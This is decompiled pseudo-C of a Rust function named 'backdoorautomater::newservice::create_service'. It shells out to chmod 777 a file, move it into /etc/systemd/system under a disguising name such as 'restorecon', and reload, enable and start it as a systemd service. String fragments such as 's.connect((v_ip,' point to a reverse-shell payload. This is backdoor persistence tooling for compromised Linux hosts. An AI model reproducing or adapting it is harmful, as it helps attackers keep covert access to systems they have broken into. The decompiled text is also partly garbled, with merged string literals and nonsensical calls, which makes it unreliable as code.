long long backdoorautomater::newservice::create_service(struct_0 *a0, unsigned long long a1)
{
    int v0;  // [bp-0x2e8], Other Possible Types: char
    unsigned long long v1;  // [bp-0x2d8]
    int v2;  // [bp-0x2c8], Other Possible Types: char
    int v3;  // [bp-0x2c8]
    char v4;  // [bp-0x2b8], Other Possible Types: unsigned long long
    int v5;  // [bp-0x2a8]
    char v6;  // [bp-0x298]
    int v7;  // [bp-0x288], Other Possible Types: char
    int v8;  // [bp-0x278]
    int v9;  // [bp-0x268], Other Possible Types: char
    unsigned long long v10;  // [bp-0x260]
    unsigned long long v11;  // [bp-0x258]
    unsigned long long v12;  // [bp-0x248]
    int v13;  // [bp-0x248]
    char v14;  // [bp-0x248]
    unsigned long long v15;  // [bp-0x240]
    unsigned long long v16;  // [bp-0x238]
    int v17;  // [bp-0x208], Other Possible Types: void*
    int v18;  // [bp-0x208]
    unsigned long long v19;  // [bp-0x200]
    void* v20;  // [bp-0x1f8], Other Possible Types: unsigned long long
    unsigned long long v21;  // [bp-0x1e8]
    unsigned long long v22;  // [bp-0x1e0]
    char *v23;  // [bp-0x1d8], Other Possible Types: int, unsigned long long
    int v24;  // [bp-0x1d0], Other Possible Types: unsigned long long
    int v25;  // [bp-0x1d0]
    int v26;  // [bp-0x1d0]
    void* v27;  // [bp-0x1c8]
    int v28;  // [bp-0x118]
    void* v29;  // [bp-0x118]
    unsigned long long v30;  // [bp-0x110]
    void* v31;  // [bp-0x108]
    unsigned long long v32;  // [bp-0x100]
    unsigned long long v33;  // [bp-0xf8]
    unsigned long long v34;  // [bp-0xf0]
    char v35;  // [bp-0xe8]
    unsigned long long v36;  // [bp-0xd8]
    char v37;  // [bp-0xc8]
    unsigned long long v38;  // [bp-0xb8]
    char v39;  // [bp-0xa8]
    unsigned long long v40;  // [bp-0x98]
    char v41;  // [bp-0x88]
    unsigned long long v42;  // [bp-0x78]
    char v43;  // [bp-0x68]
    unsigned long long v44;  // [bp-0x58]
    char v45;  // [bp-0x48]
    unsigned long long v46;  // [bp-0x38]
    unsigned long long v50;  // rdx
    int v52;  // xmm1
    int v55;  // xmm1
    int v58;  // xmm1
    int v61;  // xmm1
    int v64;  // xmm1
    int v67;  // xmm1
    void* v69;  // rsi

    backdoorautomater::sanitizer::sanitize_service_exist(a0);
    v21 = "chmod 777 sh-cFailed to execute commandsrc/newservice.rs";
    v22 = 10;
    *((int128_t *)&v23) = *((int128_t *)&a0->field_8);
    alloc::str::join_generic_copy(&v14, &v21, 2, 1, 0);
    v38 = v16;
    memcpy(&v37, &v14, 16);
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v37));
    v7.expect(&v14, &g_62a070);
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy(*((long long *)&v9), v10);
    v21.to_vec(v14.deref(), v50);
    v1 = v23;
    memcpy(&v0, &v21, 16);
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21 = "mv restorecon /etc/systemd/system/";
    v22 = 3;
    *((int128_t *)&v23) = *((int128_t *)&a0->field_8);
    alloc::str::join_generic_copy(&v14, &v21, 2, 1, 0);
    v36 = v16;
    memcpy(&v35, &v14, 16);
    v35.extend_from_slice(" /etc/systemd/system/restoreconokchmod 777 sh-cFailed to execute commandsrc/newservice.rs", 21);
    v35.extend_from_slice(*((long long *)&a0->field_8), *((long long *)&a0[1].padding_0[7]));
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v35));
    v2.expect(&v14, &g_62a088);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    v52 = *((int128_t *)&v4);
    v9 = v5;
    v8 = v52;
    v7 = v2;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = v23;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = v4;
    v0 = v3;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21.to_vec("restoreconokchmod 777 sh-cFailed to execute commandsrc/newservice.rs", 10);
    v40 = v23;
    memcpy(&v39, &v21, 16);
    if ((char)backdoorautomater::sanitizer::sanitize_command_exist(&v39))
    {
        alloc::str::join_generic_copy(&v21, &g_62a0a0, 2, 1, 0);
        v20 = v23;
        *((int128_t *)&v17) = *((int128_t *)&v21);
        (char)v17.extend_from_slice(*((long long *)&a0->field_8), *((long long *)&a0[1].padding_0[7]));
        v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
        v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&(char)v17));
        v2.expect(&v14, &g_62a0c0);
        ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
        v11 = *((long long *)&v6);
        v55 = *((int128_t *)&v4);
        v9 = v5;
        v8 = v55;
        v7 = v3;
        ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
        v14.from_utf8_lossy((long long)v9, v10);
        v21.to_vec(v14.deref(), v50);
        v4 = v23;
        memcpy(&v2, &v21, 16);
        ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
        v1 = v4;
        v0 = v3;
        ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
        backdoorautomater::sanitizer::sanitize_system_command(&v0);
        ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&(char)v17);
    }
    v33 = "systemctl daemon-reloadsystemctl enable systemctl stop ";
    v34 = 23;
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v33));
    v3.expect(&v14, &g_62a0d8);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    v58 = *((int128_t *)&v4);
    v9 = v5;
    v8 = v58;
    v7 = v3;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = v23;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = v4;
    v0 = v2;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21 = "systemctl enable systemctl stop ";
    v22 = 17;
    *((int128_t *)&v23) = *((int128_t *)&a0->field_8);
    alloc::str::join_generic_copy(&v14, &v21, 2, 1, 0);
    v42 = v16;
    memcpy(&v41, &v14, 16);
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v41));
    v3.expect(&v14, &g_62a0f0);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    v61 = *((int128_t *)&v4);
    v9 = v5;
    v8 = v61;
    v7 = v2;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = v23;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = v4;
    v0 = v2;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_ex_stderr(&v0);
    v33 = "systemctl daemon-reloadsystemctl enable systemctl stop ";
    v34 = 23;
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v33));
    v3.expect(&v14, &g_62a108);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    v64 = *((int128_t *)&v4);
    v9 = v5;
    v8 = v64;
    v7 = v2;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = v23;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = v4;
    v0 = v2;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21 = "systemctl stop ";
    v22 = 15;
    *((int128_t *)&v23) = *((int128_t *)&a0->field_8);
    alloc::str::join_generic_copy(&v14, &v21, 2, 1, 0);
    v44 = v16;
    memcpy(&v43, &v14, 16);
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v43));
    v3.expect(&v14, &g_62a120);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    v67 = *((int128_t *)&v4);
    v9 = v5;
    v8 = v67;
    v7 = v2;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = v23;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = v4;
    v0 = v2;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21 = "systemctl start s.connect((v_ip,";
    v22 = 16;
    *((int128_t *)&v23) = *((int128_t *)&a0->field_8);
    alloc::str::join_generic_copy(&v14, &v21, 2, 1, 0);
    v46 = v16;
    memcpy(&v45, &v14, 16);
    v29 = 0;
    v30 = 1;
    v31 = 0;
    v17 = 0;
    v19 = 1;
    v20 = 0;
    for (v69 = 0; !(char)1.index(v69).equal(v50, "okchmod 777 sh-cFailed to execute commandsrc/newservice.rs", 2); v69 = v20)
    {
        v21 = &g_62a190;
        v22 = 1;
        v23 = 8;
        *((uint128_t *)&v25) = 0;
        std::io::stdio::_print(&v21);
        v12 = a1;
        v15 = <alloc::string::String as core::fmt::Display>::fmt;
        v21 = &g_62a1a0;
        v22 = 2;
        v27 = 0;
        v23 = &v12;
        v24 = 1;
        std::io::stdio::_print(&v21);
        v21 = &g_62a1c0;
        v22 = 1;
        v23 = 8;
        *((uint128_t *)&v25) = 0;
        std::io::stdio::_print(&v21);
        v21 = std::io::stdio::stdin();
        v21.read_line(&v29).expect(v50);
        v21.to_vec(core::str::<impl str>::trim_end_matches(1, v31, 10), v50);
        v16 = v23;
        *((int128_t *)&v13) = *((int128_t *)&v21);
        ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v29);
        v31 = v16;
        *((int128_t *)&v28) = (int128_t)v13;
        v21.clone(&v29);
        ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v17);
        v20 = v23;
        *((int128_t *)&v18) = *((int128_t *)&v21);
        v29.clear();
    }
    v21 = &g_62a138;
    v22 = 1;
    v23 = 8;
    *((uint128_t *)&v26) = 0;
    std::io::stdio::_print(&v21);
    v21.new("sh-cFailed to execute commandsrc/newservice.rs", 2);
    v14.output(v21.arg("-cFailed to execute commandsrc/newservice.rs", 2).arg(&v45));
    v3.expect(&v14, &g_62a148);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    v11 = *((long long *)&v6);
    memcpy(&(char)v9, &v5, 16);
    memcpy(&v8, &v4, 16);
    v7 = v2;
    ::0x456170::core::ptr::drop_in_place<std::process::Command>(&v21);
    v14.from_utf8_lossy((long long)v9, v10);
    v21.to_vec(v14.deref(), v50);
    v4 = 8;
    memcpy(&v2, &v21, 16);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    v1 = 8;
    v0 = v2;
    ::0x456210::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v14);
    backdoorautomater::sanitizer::sanitize_system_command(&v0);
    v21 = &g_62a160;
    v22 = 1;
    v23 = 8;
    *((uint128_t *)&v24) = 0;
    std::io::stdio::_print(&v21);
    v12 = a1;
    v15 = <alloc::string::String as core::fmt::Display>::fmt;
    v21 = &g_62a170;
    v22 = 2;
    v27 = 0;
    v23 = &v12;
    v24 = 1;
    std::io::stdio::_print(&v21);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v17);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v29);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v45);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v43);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v41);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v39);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v35);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v0);
    ::0x456110::core::ptr::drop_in_place<std::process::Output>(&v7);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(&v37);
    ::0x456150::core::ptr::drop_in_place<alloc::string::String>(a1);
    return ::0x456150::core::ptr::drop_in_place<alloc::string::String>(v32);
}
